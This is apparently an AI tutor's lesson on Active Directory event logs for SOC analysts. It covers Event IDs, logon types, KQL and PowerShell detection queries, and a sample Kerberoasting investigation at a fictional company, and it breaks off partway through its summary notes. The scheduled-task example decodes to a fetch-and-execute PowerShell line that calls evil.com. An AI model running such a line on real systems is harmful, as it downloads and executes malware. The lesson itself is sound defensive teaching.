Perfect! And I'll follow the plan strictly from now — one day, one topic, section by section, interactive. 🎯

---

# 🔵 PHASE 1 — DAY 4
# AD Logs & Event IDs — Complete Playbook
### *"Logs are the only witness to a crime that leaves no fingerprints"*

---

## 🧭 THE DAY 4 MINDSET

```
DAY 1 — You learned WHAT AD is (structure)
DAY 2 — You learned HOW attacks happen (offensive)
DAY 3 — You learned HOW to harden (defensive)
DAY 4 — You learn HOW TO SEE IT ALL IN LOGS

This is the SOC Analyst's core skill.
Attackers can hide their tools.
Attackers can delete files.
But logs — if forwarded to Sentinel — are very hard to erase.

Navi's job = Read logs faster and smarter than the attacker moves.
```

> 🔗 **Your connection:** You've opened Event Viewer before when troubleshooting — user can't login, service failing, sync errors. Today we use the exact same logs but look for **completely different patterns.** Same tool, security lens.

---

## 📌 SECTION 1 of 5
## How Windows Logging Works — The Architecture

---

Before reading logs, you need to understand **where they come from** and **why most organizations are flying blind.**

### The Logging Chain in SecureCorp

```
WHERE EVENTS ARE BORN:
══════════════════════════════════════════════════════════

ACTION HAPPENS:
  Hareesh logs into DC01
  Gani fails password 5 times
  Attacker runs Mimikatz on SQLDB01
          ↓
WINDOWS GENERATES EVENT:
  Written to local Windows Event Log
  Location: C:\Windows\System32\winevt\Logs\
  Files: Security.evtx, System.evtx, Application.evtx
          ↓
EVENT SITS ON LOCAL MACHINE:
  If machine is compromised → attacker can delete these
  If machine crashes → logs lost
  If log fills up → oldest events overwritten
  DEFAULT LOG SIZE = 20MB ← tiny, fills in hours on busy DC
          ↓
FORWARDING TO CENTRAL LOCATION:
  Windows Event Forwarding (WEF) → Central collector
  Microsoft Monitoring Agent → Log Analytics Workspace
  Sentinel connector → Microsoft Sentinel
          ↓
NAVI SEES EVERYTHING IN ONE PLACE:
  Microsoft Sentinel dashboard
  KQL queries across ALL machines
  Alerts fire automatically
  Evidence preserved even if source machine wiped

══════════════════════════════════════════════════════════
THE SECURITY PROBLEM:
Without central forwarding → each machine is an island
Attacker compromises SQLDB01 → deletes local logs
Evidence gone. Breach undetectable.

WITH central forwarding → logs already in Sentinel
Attacker deletes local logs → doesn't matter
Evidence preserved. Breach detected.
══════════════════════════════════════════════════════════
```

### The Three Critical Log Channels

```
CHANNEL 1 — SECURITY LOG
─────────────────────────────────────────────────────────
Location: Event Viewer → Windows Logs → Security
What it captures:
  → All login attempts (success and failure)
  → Account management changes
  → Privilege usage
  → Object access (files, AD objects)
  → Policy changes
  → Process creation (if audit enabled)

Who writes to it: Windows Security Subsystem (LSASS)
Size default: 20MB (increase to 1GB on DCs!)
Most important for: SOC Analysts — 80% of detection here

CHANNEL 2 — SYSTEM LOG
─────────────────────────────────────────────────────────
Location: Event Viewer → Windows Logs → System
What it captures:
  → Service start/stop
  → Driver events
  → System errors
  → Group Policy processing

Most important for: Detecting service manipulation

CHANNEL 3 — APPLICATION LOG
─────────────────────────────────────────────────────────
Location: Event Viewer → Windows Logs → Application
What it captures:
  → Application errors
  → Database events
  → Custom application logging

Most important for: Application-level attack detection

BONUS — POWERSHELL LOGS (Critical for SOC):
─────────────────────────────────────────────────────────
Location: Event Viewer →
  Applications and Services Logs →
  Microsoft → Windows → PowerShell → Operational

What it captures (when enabled via GPO):
  → Every PowerShell command run
  → Script block content (even if obfuscated — decoded!)
  → Module loading events

Event IDs:
  4103 → Module logging (command executed)
  4104 → Script block logging (full script content)
  4105 → Script started
  4106 → Script stopped

Why critical:
  Mimikatz, BloodHound, Empire — all run via PowerShell
  Script block logging captures EXACTLY what ran
  Even if attacker uses obfuscation → Windows decodes it first
  THEN logs it → you see the real command
```
Perfect! Let's go straight into the Event IDs. 🎯

---

## 📌 SECTION 2 of 5
## The Master Event ID Playbook — SecureCorp Edition

---

### How to Read an Event — Anatomy First

Before memorizing IDs, understand what's inside every event:

```
SAMPLE EVENT — Gani fails to login:
══════════════════════════════════════════════════════════
Log Name:    Security
Source:      Microsoft-Windows-Security-Auditing
Event ID:    4625
Level:       Information
Date/Time:   05/04/2026 09:15:32

DESCRIPTION:
An account failed to log on.

Subject:
  Security ID:    SYSTEM
  Account Name:   GANI-LAPTOP$
  Account Domain: SECURECORP

Account That Failed to Log On:
  Account Name:   gani                ← WHO tried to login
  Account Domain: SECURECORP

Failure Information:
  Failure Reason: Unknown user name or bad password
  Status:         0xC000006D
  Sub Status:     0xC000006A          ← exact failure reason

Network Information:
  Workstation:    GANI-LAPTOP         ← WHERE from
  Source IP:      192.168.1.88        ← WHICH IP

Detailed Authentication:
  Logon Type:     3                   ← HOW (network logon)
  Auth Package:   NTLM                ← WHICH protocol
══════════════════════════════════════════════════════════

AS SOC ANALYST — YOU READ:
WHO   → gani
WHAT  → Failed login
WHERE → 192.168.1.88 (Gani's laptop)
HOW   → NTLM, Network logon type 3
WHY   → Bad password (0xC000006A)
WHEN  → 09:15:32
```

> 🎯 **Navi's habit:** Every alert — ask WHO, WHAT, WHERE, HOW, WHEN. Answer all five before deciding if it's real or false positive.

---

### The Logon Types — Critical for SOC Analysis

Before Event IDs — you MUST know Logon Types. They appear in almost every authentication event.

```
LOGON TYPE TABLE:
══════════════════════════════════════════════════════════
Type  Name              What It Means          Security Note
──────────────────────────────────────────────────────────
2     Interactive       Physical keyboard login Normal for workstations
                        or console login        

3     Network           Accessing network share Most common type
                        (file share, printer)   PtH appears here

4     Batch             Scheduled task ran      Check what task ran

5     Service           Windows service started Check service account

7     Unlock            Screen unlock           Normal, monitor fails

8     NetworkCleartext  Password sent as clear  🚨 DANGEROUS
                        text over network       Legacy apps use this

9     NewCredentials    RunAs with different    Lateral movement sign
                        credentials             

10    RemoteInteractive RDP login               Monitor closely

11    CachedInteractive Cached domain login     Offline login
                        (no DC contact)

══════════════════════════════════════════════════════════

WHAT NAVI FOCUSES ON:
Type 3  + NTLM + Admin account = Possible Pass-the-Hash 🚨
Type 8  + Any account          = Clear text password 🚨
Type 9  + Unexpected account   = Lateral movement 🚨
Type 10 + After hours          = Suspicious RDP 🚨
```

---

### THE MASTER EVENT ID TABLE — SecureCorp SOC Reference

Now let's go through every critical Event ID — with SecureCorp examples for each.

---

#### 🔴 AUTHENTICATION EVENTS

**Event ID 4624 — Successful Login**

```
WHAT IT MEANS: Someone successfully logged in

NORMAL EXAMPLE:
  Hareesh logs into his workstation at 9 AM → 4624
  Logon Type 2, Kerberos, from his known IP

SUSPICIOUS EXAMPLES:
─────────────────────────────────────────────────────────
SCENARIO A — Pass-the-Hash indicator:
  Account: hareesh-t0 (Tier 0 admin)
  Logon Type: 3 (Network)
  Auth Package: NTLM  ← 🚨 Admin should use Kerberos
  Source IP: 192.168.1.88 (Gani's laptop!)
  Time: 2:00 AM
  = Attacker used Hareesh's hash from Gani's machine

SCENARIO B — Lateral Movement:
  Account: hareesh
  Logon Type: 3
  Source: Multiple different machines in 10 minutes
  = Someone is moving across the network

SCENARIO C — After Hours Admin Login:
  Account: hareesh-t0
  Time: 3:00 AM Sunday
  Logon Type: 10 (RDP)
  = Unusual — alert Navi immediately
─────────────────────────────────────────────────────────

KEY FIELDS TO CHECK:
  Logon Type    → Type of access
  Auth Package  → Kerberos=good, NTLM=investigate
  Source IP     → Expected location?
  Account       → Right account for this resource?
  Time          → Business hours?
```

---

**Event ID 4625 — Failed Login**

```
WHAT IT MEANS: Login attempt failed

FAILURE CODES — Know These Cold:
─────────────────────────────────────────────────────────
Sub Status    Meaning                  Attack Indicator
──────────────────────────────────────────────────────────
0xC000006A    Wrong password           Brute force / spray
0xC0000064    Username doesn't exist   Enumeration attempt
0xC000006D    Generic auth failure     Password spray
0xC000006F    Outside logon hours      Policy restriction
0xC0000070    Workstation restriction  Unusual source machine
0xC0000072    Account disabled         Attacker using old acct
0xC000015B    Logon type not granted   Wrong logon method
0xC0000192    Netlogon not started     DC issue
0xC0000193    Account expired          Old account targeted
0xC0000234    Account locked out       Lockout triggered
─────────────────────────────────────────────────────────

NAVI'S DETECTION PATTERNS:

PATTERN 1 — Brute Force:
  Same account
  Many 4625s in short time
  Same source IP
  → Account lockout follows (4740)

PATTERN 2 — Password Spray:
  DIFFERENT accounts
  ONE failure each
  Same source IP
  Same time period
  Sub Status: 0xC000006A (wrong password)
  → No lockout triggered ← that's the point

PATTERN 3 — Username Enumeration:
  Many failures
  Sub Status: 0xC0000064 (username doesn't exist)
  → Attacker is guessing usernames first

PATTERN 4 — Disabled Account Targeting:
  Sub Status: 0xC0000072 (account disabled)
  → Attacker has old credentials list
  → Check: is this account actually disabled?
    If not → potential account manipulation
```

---

**Event ID 4648 — Login with Explicit Credentials**

```
WHAT IT MEANS:
A process logged on using explicitly specified credentials
(RunAs, or passing credentials programmatically)

NORMAL:
  Hareesh uses RunAs to run a tool as hareesh-t0
  Scheduled task runs with specific service account

SUSPICIOUS — LATERAL MOVEMENT INDICATOR:
─────────────────────────────────────────────────────────
Event on GANI-LAPTOP:
  Subject Account: gani (logged in user)
  Account Whose Credentials Used: hareesh-t0
  Target Server: SQLDB01
  Process: cmd.exe or powershell.exe

Translation:
  Gani's machine made a connection to SQLDB01
  Using Hareesh's admin credentials
  Via command line

= Attacker on Gani's machine used stolen admin credentials
  to connect to SQLDB01
─────────────────────────────────────────────────────────

WHY THIS IS GOLD FOR NAVI:
4648 fires on the SOURCE machine
4624 fires on the DESTINATION machine
Together → you see the full lateral movement path:
  4648 on GANI-LAPTOP → 4624 on SQLDB01
  = Movement from Gani's machine to SQLDB01
```

---

**Event ID 4771 — Kerberos Pre-Authentication Failed**

```
WHAT IT MEANS:
Kerberos login attempt failed
(Pre-authentication = first step of Kerberos login)

NORMAL: User types wrong password once

SUSPICIOUS:
─────────────────────────────────────────────────────────
PATTERN — Password Spray via Kerberos:
  Multiple accounts
  Failure Code: 0x18 (wrong password)
  Same Client IP
  Rapid succession

This is the Kerberos version of 4625.
Attackers sometimes use Kerberos spray instead of NTLM
because it's slightly less monitored.

KEY FAILURE CODES:
0x6  = Username doesn't exist (enumeration)
0x12 = Account disabled/locked/expired
0x17 = Password expired
0x18 = Wrong password ← most common in attacks
0x25 = Clock skew too great (time sync issue)
```

---

#### 🟡 ACCOUNT MANAGEMENT EVENTS

**Event ID 4720 — User Account Created**

```
WHAT IT MEANS: New user account created in AD

NORMAL:
  Chaitu (HR) tells Jayanth: "Onboard new developer"
  Hareesh creates account → 4720 fires

SUSPICIOUS:
─────────────────────────────────────────────────────────
SCENARIO — Attacker creates backdoor account:
  Time: 3:17 AM
  Created by: hareesh-t0  ← (attacker using stolen creds)
  New Account: svc_support2
  Description: blank
  Password: never expires, no complexity

Navi's alert:
  "Account created outside business hours by admin"
  Immediate escalation — was Hareesh even awake?
─────────────────────────────────────────────────────────

CORRELATE WITH:
  4724 (password set for new account)
  4728 (added to security group)
  4732 (added to local admins)
  All firing in sequence = attacker building backdoor
```

---

**Event ID 4728 / 4732 / 4756 — Added to Security Group**

```
4728 → Added to Global Security Group
4732 → Added to Local Security Group
4756 → Added to Universal Security Group

WHAT TO WATCH:

CRITICAL GROUPS — Alert immediately if anyone added:
  Domain Admins        (4728)
  Enterprise Admins    (4728)
  Schema Admins        (4728)
  Administrators       (4732 on DC)
  Backup Operators     (4728)

SUSPICIOUS PATTERN — Privilege Escalation:
  Time: 2:47 AM
  Group: Domain Admins
  Member Added: svc_support2  ← (new account from 10 mins ago)
  Added By: hareesh-t0

Translation:
  Attacker created account → immediately made it Domain Admin
  Classic backdoor creation sequence

Navi's Sentinel alert fires within 30 seconds.
```

---

**Event ID 4740 — Account Locked Out**

```
WHAT IT MEANS: Account exceeded failed login threshold

NORMAL: User forgot password → 3-5 failures → lockout

SUSPICIOUS PATTERNS:
─────────────────────────────────────────────────────────
PATTERN 1 — Brute Force Confirmed:
  Many 4625s → then 4740 for same account
  Source IP: external
  = Active brute force attack

PATTERN 2 — Mass Lockout:
  20+ accounts locked in 5 minutes
  = Password spray hitting lockout threshold
  = Attacker was less careful than usual
  = Operational disruption for real users

PATTERN 3 — Admin Account Lockout:
  hareesh-t0 locked out
  Source: Unknown workstation
  = Attacker trying to brute force admin account
  = OR legitimate admin locked themselves out
  Either way → investigate immediately

IMPORTANT NOTE FOR TROUBLESHOOTING:
  4740 tells you WHICH machine caused the lockout
  Field: "Caller Computer Name"
  That machine = source of the lockout
  Check that machine for:
  → Cached credentials (old password in app)
  → Mapped drives with old password
  → Scheduled tasks with expired credentials
```

---

#### 🔴 PRIVILEGE & POLICY EVENTS

**Event ID 4672 — Special Privileges Assigned**

```
WHAT IT MEANS:
A user logged in with administrative privileges
(SeDebugPrivilege, SeTcbPrivilege etc.)

Fires every time a privileged account logs in.

NORMAL:
  Hareesh-t0 logs into DC01 → 4672 fires
  Expected — he's a Domain Admin

SUSPICIOUS:
─────────────────────────────────────────────────────────
SCENARIO:
  Account: gani  ← standard user!
  Privileges: SeDebugPrivilege, SeImpersonatePrivilege
  Machine: GANI-LAPTOP
  Time: 11:30 PM

Translation:
  Gani (standard user) suddenly has debug privileges
  SeDebugPrivilege = can read any process memory
  = Required by Mimikatz to dump LSASS
  = Privilege escalation attack in progress

CRITICAL PRIVILEGES TO MONITOR:
  SeDebugPrivilege       → Can read any process (Mimikatz!)
  SeImpersonatePrivilege → Can impersonate other users
  SeTcbPrivilege         → Act as part of OS
  SeBackupPrivilege      → Read any file regardless of ACL
  SeRestorePrivilege     → Write any file regardless of ACL
  SeTakeOwnershipPrivilege → Take ownership of any object
```

---

**Event ID 4698 / 4702 — Scheduled Task Created / Modified**

```
4698 → Scheduled Task Created
4702 → Scheduled Task Modified

WHY ATTACKERS LOVE SCHEDULED TASKS:
  → Persistence mechanism
  → Runs even if user logs out
  → Can run as SYSTEM
  → Survives reboots

SUSPICIOUS PATTERN:
─────────────────────────────────────────────────────────
Event 4698 on SQLDB01:
  Task Name: \Microsoft\Windows\UpdateCheck  ← fake MS name
  Run As: SYSTEM
  Action: powershell.exe -enc JABjAGwAaQBlAG...  ← base64!
  Created By: hareesh (stolen credentials)
  Time: 1:17 AM

RED FLAGS:
  → Base64 encoded command (-enc flag)
  → Fake Microsoft-looking name
  → Created outside business hours
  → Runs as SYSTEM
  → Created by admin account at unusual time

Navi decodes the base64 immediately:
  [System.Text.Encoding]::UTF8.GetString(
    [Convert]::FromBase64String("JABjAGwAaQBlAG...")
  )
  Result: IEX (New-Object Net.WebClient).DownloadString
          ('http://evil.com/payload.ps1')
  = Malware download — active attack
```

---

#### 🔴 THE BIG THREE — DCSync, Golden Ticket, Kerberoasting

**Event ID 4662 — Object Operation on AD (DCSync Detector)**

```
WHAT IT MEANS:
An operation was performed on an AD object

NORMALLY: Boring — happens thousands of times per day

THE CRITICAL COMBINATION:
─────────────────────────────────────────────────────────
Event 4662 WHERE:
  Object Type: domainDNS  ← the domain object itself
  Properties accessed:
    {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}
    (Replicating Directory Changes)
    {1131f6ab-9c07-11d1-f79f-00c04fc2dcd2}
    (Replicating Directory Changes All)
  Access Mask: 0x100
  Subject Account: NOT a Domain Controller  ← 🚨🚨🚨

Translation:
  A NON-DC account is requesting replication rights
  = DCSync attack in progress
  = Attacker is dumping ALL password hashes RIGHT NOW

Navi's response time target: < 2 minutes
This is a P0 (Critical) incident.
─────────────────────────────────────────────────────────

KQL QUERY — Navi runs this in Sentinel:
SecurityEvent
| where EventID == 4662
| where ObjectType == "domainDNS"
| where Properties has "1131f6aa" or Properties has "1131f6ab"
| where SubjectUserName !endswith "$"  // exclude computer accounts
| project TimeGenerated, SubjectUserName,
          SubjectDomainName, IpAddress
```

---

**Event ID 4769 — Kerberos Service Ticket Requested (Kerberoasting)**

```
WHAT IT MEANS:
A Kerberos service ticket was requested for a service account

NORMAL: Happens thousands of times per day — totally expected

THE KERBEROASTING INDICATOR:
─────────────────────────────────────────────────────────
Event 4769 WHERE:
  Ticket Encryption Type: 0x17  ← RC4-HMAC 🚨
  (Normal is 0x12 = AES256)
  Service Name: sqlsvc (service account with SPN)
  Requesting Account: gani (low privilege user)
  Client IP: 192.168.1.88

Translation:
  Low privilege user requested RC4-encrypted ticket
  for a service account
  RC4 = weaker = faster to crack offline
  = Kerberoasting attack
─────────────────────────────────────────────────────────

ENCRYPTION TYPE REFERENCE:
  0x1  → DES-CBC-CRC      🚨 Very weak — ancient
  0x3  → DES-CBC-MD5      🚨 Very weak — ancient
  0x11 → AES128           ✅ Strong
  0x12 → AES256           ✅ Strongest — what you want
  0x17 → RC4-HMAC         🚨 Weak — Kerberoasting target
  0x18 → RC4-HMAC-EXP     🚨 Weak

KQL QUERY — Detects Kerberoasting:
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17"
| where ServiceName !endswith "$"  // exclude computer accounts
| where ServiceName != "krbtgt"
| summarize
    RequestCount = count(),
    TargetServices = make_set(ServiceName)
    by SubjectUserName, IpAddress, bin(TimeGenerated, 5m)
| where RequestCount > 3
```

---

**Event ID 4768 — Kerberos TGT Requested (Golden Ticket Detector)**

```
WHAT IT MEANS:
A TGT (Ticket Granting Ticket) was requested

NORMALLY: Every login generates this — very common

GOLDEN TICKET INDICATORS:
─────────────────────────────────────────────────────────
INDICATOR 1 — Nonexistent account:
  Event 4768 on DC01
  Account: "HackerAdmin"
  Result: 0x0 (Success!)
  But: No 4720 ever created this account
  = Forged ticket for account that doesn't exist in AD

INDICATOR 2 — Impossible ticket lifetime:
  TGT lifetime: 87,600 hours (10 years!)
  Normal max: 10 hours
  = Forged ticket with custom lifetime

INDICATOR 3 — Wrong encryption on krbtgt:
  Account: krbtgt
  Ticket Encryption: 0x17 (RC4)
  But: You enforced AES on krbtgt
  = Old hash being used = pre-rotation Golden Ticket

INDICATOR 4 — PAC validation failure:
  Seen in: Microsoft Defender for Identity alerts
  "Forged PAC detected"
  = Golden ticket with wrong PAC signature
─────────────────────────────────────────────────────────

IMPORTANT:
Golden Ticket is the hardest to detect in raw logs.
Microsoft Defender for Identity (MDI) detects it
much better than manual log analysis.
This is why MDI is non-negotiable on DC01.
```

---

## 📌 SECTION 3 of 5
## Navi's Real Morning Routine — Log Triage in SecureCorp

---

```
⏰ 09:00 AM — NAVI OPENS SENTINEL

STEP 1 — OVERNIGHT ALERTS REVIEW (15 minutes):
─────────────────────────────────────────────────────────
Sentinel → Incidents → Last 12 hours

Priority order:
🔴 Critical: DCSync (4662), Golden Ticket (4768 anomaly)
🟠 High:     Mass lockout (4740), Admin created (4720)
🟡 Medium:   Failed logins spike (4625), New RDP (4624 type 10)
🟢 Low:      Single failures, normal admin activity

Overnight summary for SecureCorp:
  🟡 47 failed logins — chaitu@securecorp.local
     Source: 192.168.1.105 (Chaitu's laptop)
     Time: Between 8PM-10PM
     = Chaitu working late, forgot new password
     Action: Verify with Chaitu. Likely false positive.

  🟡 3 Kerberos RC4 requests — gani account
     Target service: sqlsvc
     Time: 11:47 PM
     = Suspicious — Gani shouldn't be requesting SQL tickets
     Action: INVESTIGATE

  🟢 Scheduled task modified — FILESVR01
     Modified by: backupsvc (service account)
     = Likely automated backup reconfiguration
     Action: Verify against change management ticket

STEP 2 — INVESTIGATE THE SUSPICIOUS ONE (20 minutes):
─────────────────────────────────────────────────────────
Navi investigates: 3 RC4 Kerberos requests from Gani

Query 1 — What was Gani doing at 11:47 PM?
─────────────────────────────────────────────
SecurityEvent
| where TimeGenerated between (
    datetime(2026-04-04 23:40:00) ..
    datetime(2026-04-04 23:55:00))
| where SubjectUserName == "gani"
| project TimeGenerated, EventID, Activity, IpAddress
| sort by TimeGenerated asc

Results:
23:41:15  4624  Login Success    192.168.1.88  (Gani's laptop)
23:41:17  4672  Special privs    192.168.1.88
23:42:03  4769  Kerberos TGS     0x17 RC4 → sqlsvc
23:42:04  4769  Kerberos TGS     0x17 RC4 → backupsvc
23:42:05  4769  Kerberos TGS     0x17 RC4 → monitorsvc
23:42:47  4688  Process created  powershell.exe → GetUserSPNs

🚨 CONFIRMED KERBEROASTING ATTACK

Query 2 — What process ran?
─────────────────────────────────────────────
SecurityEvent
| where EventID == 4688
| where TimeGenerated between (datetime(2026-04-04 23:40:00)
                             .. datetime(2026-04-04 23:55:00))
| where SubjectUserName == "gani"
| project TimeGenerated, NewProcessName, CommandLine

Result:
ProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell -c "GetUserSPNs.py securecorp.local/gani..."
             ← Impacket tool running!

STEP 3 — CONTAINMENT (immediate):
─────────────────────────────────────────────────────────
1. Disable Gani's account → prevent further access
2. Revoke all Gani's Kerberos tickets:
   Invoke-Command -ComputerName DC01 {
     Get-ADUser gani | Set-ADUser -Replace @{msDS-KeyVersionNumber=10}
   }
3. Check if sqlsvc password needs immediate rotation
4. Isolate Gani's laptop from network
5. Escalate to Hareesh
6. Open P1 incident ticket
```

---

## 📌 SECTION 4 of 5
## PowerShell Commands — Navi's Live Investigation Toolkit

---

```powershell
# ══════════════════════════════════════════════════════════
# TOOLKIT 1 — QUICK FAILED LOGIN ANALYSIS
# ══════════════════════════════════════════════════════════

# Get all failed logins in last 24 hours:
Get-WinEvent -FilterHashtable @{
  LogName   = 'Security'
  Id        = 4625
  StartTime = (Get-Date).AddHours(-24)
} | ForEach-Object {
  [PSCustomObject]@{
    Time      = $_.TimeCreated
    Account   = $_.Properties[5].Value
    Domain    = $_.Properties[6].Value
    SourceIP  = $_.Properties[19].Value
    Reason    = $_.Properties[9].Value
    LogonType = $_.Properties[10].Value
  }
} | Group-Object Account |
  Sort-Object Count -Descending |
  Select-Object Name, Count |
  Format-Table -AutoSize

# Output shows: which accounts have most failures
# Top of list = brute force targets

# ══════════════════════════════════════════════════════════
# TOOLKIT 2 — FIND SOURCE OF ACCOUNT LOCKOUT
# ══════════════════════════════════════════════════════════

# Find which machine is causing lockout:
Get-WinEvent -FilterHashtable @{
  LogName = 'Security'
  Id      = 4740
} -MaxEvents 10 | ForEach-Object {
  [PSCustomObject]@{
    Time            = $_.TimeCreated
    LockedAccount   = $_.Properties[0].Value
    CallerMachine   = $_.Properties[1].Value  # ← THE KEY FIELD
    DomainController = $_.MachineName
  }
} | Format-Table -AutoSize

# CallerMachine = the machine sending bad passwords
# Go to that machine and check:
# → Mapped drives with old credentials
# → Scheduled tasks with expired password
# → Applications with cached credentials

# ══════════════════════════════════════════════════════════
# TOOLKIT 3 — FIND ALL ADMIN LOGINS IN LAST HOUR
# ══════════════════════════════════════════════════════════

# Who used admin privileges recently?
Get-WinEvent -FilterHashtable @{
  LogName   = 'Security'
  Id        = 4672
  StartTime = (Get-Date).AddHours(-1)
} | ForEach-Object {
  [PSCustomObject]@{
    Time     = $_.TimeCreated
    Account  = $_.Properties[1].Value
    Domain   = $_.Properties[2].Value
    LogonID  = $_.Properties[3].Value
  }
} | Where-Object {
  $_.Account -notmatch 'SYSTEM|LOCAL SERVICE|NETWORK SERVICE'
} | Format-Table -AutoSize

# Filter out system accounts → focus on human admins
# Any unexpected admin logins? Investigate.

# ══════════════════════════════════════════════════════════
# TOOLKIT 4 — DETECT KERBEROASTING ATTEMPTS
# ══════════════════════════════════════════════════════════

# Find RC4 Kerberos ticket requests (Kerberoasting):
Get-WinEvent -FilterHashtable @{
  LogName   = 'Security'
  Id        = 4769
  StartTime = (Get-Date).AddHours(-24)
} | ForEach-Object {
  $encType = $_.Properties[6].Value
  if ($encType -eq "0x17") {  # RC4 = suspicious
    [PSCustomObject]@{
      Time           = $_.TimeCreated
      RequestedBy    = $_.Properties[0].Value
      ServiceAccount = $_.Properties[2].Value
      EncryptionType = $encType
      ClientIP       = $_.Properties[9].Value
    }
  }
} | Format-Table -AutoSize

# Any results = investigate immediately
# RC4 requests for service accounts = Kerberoasting

# ══════════════════════════════════════════════════════════
# TOOLKIT 5 — WHO WAS ADDED TO SENSITIVE GROUPS?
# ══════════════════════════════════════════════════════════

# Check group membership changes in last 24 hours:
Get-WinEvent -FilterHashtable @{
  LogName   = 'Security'
  Id        = @(4728, 4732, 4756)
  StartTime = (Get-Date).AddHours(-24)
} | ForEach-Object {
  [PSCustomObject]@{
    Time        = $_.TimeCreated
    EventID     = $_.Id
    GroupName   = $_.Properties[2].Value
    MemberAdded = $_.Properties[0].Value
    AddedBy     = $_.Properties[6].Value
  }
} | Where-Object {
  $_.GroupName -match 'Admin|Operator|Backup'
} | Format-Table -AutoSize

# Filter for sensitive group names
# Any unexpected additions = escalate immediately
```

---

## 📌 SECTION 5 of 5
## The Event ID Quick Reference Card

---

```
╔══════════════════════════════════════════════════════════════╗
║          NAVI'S EVENT ID REFERENCE — SECURECORP SOC          ║
╠══════════════════════════════════════════════════════════════╣
║ AUTHENTICATION                                               ║
║ ──────────────────────────────────────────────────────────── ║
║ 4624  Successful login     Check: type, protocol, source IP  ║
║ 4625  Failed login         Bulk = brute force or spray       ║
║ 4634  Logoff               Correlate with 4624               ║
║ 4647  User initiated logoff Normal                           ║
║ 4648  Explicit credentials Lateral movement indicator        ║
║ 4768  Kerberos TGT request Golden Ticket anomalies here      ║
║ 4769  Kerberos TGS request RC4 (0x17) = Kerberoasting        ║
║ 4771  Kerberos pre-auth fail Spray via Kerberos              ║
║ 4776  NTLM validation      Should be rare — investigate      ║
╠══════════════════════════════════════════════════════════════╣
║ ACCOUNT MANAGEMENT                                           ║
║ ──────────────────────────────────────────────────────────── ║
║ 4720  Account created      After hours = backdoor?           ║
║ 4722  Account enabled      Disabled acct reactivated?        ║
║ 4723  Password change      User changed own password         ║
║ 4724  Password reset       Admin reset password              ║
║ 4725  Account disabled     Covering tracks?                  ║
║ 4726  Account deleted      Evidence destruction?             ║
║ 4728  Added to global group Domain Admins = critical alert   ║
║ 4732  Added to local group  Admins group = alert             ║
║ 4738  Account changed       MFA removed = pre-attack sign    ║
║ 4740  Account locked        Source machine = key field       ║
║ 4756  Added to univ. group  Alert on sensitive groups        ║
╠══════════════════════════════════════════════════════════════╣
║ PRIVILEGE & POLICY                                           ║
║ ──────────────────────────────────────────────────────────── ║
║ 4672  Special privileges    SeDebugPrivilege = Mimikatz risk ║
║ 4673  Privileged service    Unusual privilege usage          ║
║ 4698  Scheduled task created Base64 command = malware        ║
║ 4702  Scheduled task modified Same — check command           ║
║ 4719  Audit policy changed  🚨 Attacker covering tracks      ║
║ 4739  Domain policy changed GPO tampering?                   ║
╠══════════════════════════════════════════════════════════════╣
║ ACTIVE DIRECTORY SPECIFIC                                    ║
║ ──────────────────────────────────────────────────────────── ║
║ 4662  AD object operation   DCSync = replication from non-DC ║
║ 4663  Object access attempt File/folder access monitoring    ║
║ 4670  Permissions changed   ACL modification on AD objects   ║
╠══════════════════════════════════════════════════════════════╣
║ POWERSHELL & PROCESS                                         ║
║ ──────────────────────────────────────────────────────────── ║
║ 4688  Process created       CommandLine = what ran?          ║
║ 4689  Process ended         Correlate with 4688              ║
║ 4103  PS Module logging     Command executed                 ║
║ 4104  PS Script block       Full script — decoded!           ║
╠══════════════════════════════════════════════════════════════╣
║ CRITICAL COMBINATIONS (These = Incidents)                    ║
║ ──────────────────────────────────────────────────────────── ║
║ 4625 x50 same IP           → Password Spray                  ║
║ 4624 + NTLM + Admin + 3AM  → Pass-the-Hash                   ║
║ 4769 + 0x17 encryption     → Kerberoasting                   ║
║ 4662 + replication + non-DC → DCSync                         ║
║ 4720 + 4728 Domain Admins  → Backdoor account creation       ║
║ 4719 (audit changed)       → Attacker covering tracks        ║
║ 4698 + base64 command      → Malware persistence             ║
║ 4688 + mimikatz/bloodhound → Active attack tools             ║
╚══════════════════════════════════════════════════════════════╝
```

---

## 🧪 DAY 4 LABS

```
LAB 1 — Live Event ID Hunting (20 min)
Platform: Your Windows machine or Azure VM
────────────────────────────────────────────────────────
# Run each toolkit command from Section 4
# On your DC01 or any Windows Server

# Start with failed logins:
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} `
  -MaxEvents 20 | Select TimeCreated, Message

# What do you see?
# → Paste the output here — we'll analyze together

LAB 2 — Simulate and Detect (30 min)
Platform: Your Azure Lab (DC01 + Windows client)
────────────────────────────────────────────────────────
Step 1: On Windows client — fail login 6 times for Gani
Step 2: On DC01 — run Toolkit 1 (failed logins)
        → Can you see the failures? Which sub status?
Step 3: On DC01 — run Toolkit 2 (lockout source)
        → Which machine caused the lockout?
Step 4: Unlock Gani's account:
        Unlock-ADAccount -Identity gani

This simulates exactly what Navi does when
a user calls saying "I'm locked out"

LAB 3 — CyberDefenders: DetectiveAD (45 min)
Platform: cyberdefenders.org (FREE)
────────────────────────────────────────────────────────
URL: cyberdefenders.org/blueteam-ctf-challenges/detectivead
→ Download the evidence file
→ Analyze AD event logs
→ Answer investigation questions
→ Real SOC analyst experience

LAB 4 — HTB Sherlock: Camp Fire 1 (45 min)
Platform: app.hackthebox.com/sherlocks (FREE)
────────────────────────────────────────────────────────
→ Kerberoasting detection from DC logs
→ Guided mode for beginners
→ Perfect application of today's Event IDs
```

---

## 📋 DAY 4 — COMPLETE NOTES

```
╔══════════════════════════════════════════════════════════╗
║         DAY 4 — AD LOGS & EVENT IDs                     ║
║                 SecureCorp Ltd.                          ║
╚══════════════════════════════════════════════════════════╝

LOGGING ARCHITECTURE:
─────────────────────────────────────────────────────────
Event happens → Windows Security Log (local .evtx)
→ Forwarded via WEF or MMA → Log Analytics Workspace
→ Ingested by Microsoft Sentinel
→ KQL queries → Alerts → Navi's dashboard

Critical log channels:
  Security    → All auth, account, privilege events
  System      → Service and system events
  Application → App-specific events
  PowerShell  → Every PS command (if GPO enabled)

Increase DC Security log size: 1GB minimum
Forward logs immediately: Local deletion = lost evidence

LOGON TYPES — KNOW THESE:
─────────────────────────────────────────────────────────
2  = Interactive (console)       Normal
3  = Network (shares, SMB)       PtH appears here
4  = Batch (scheduled task)      Check what ran
5  = Service                     Check service account
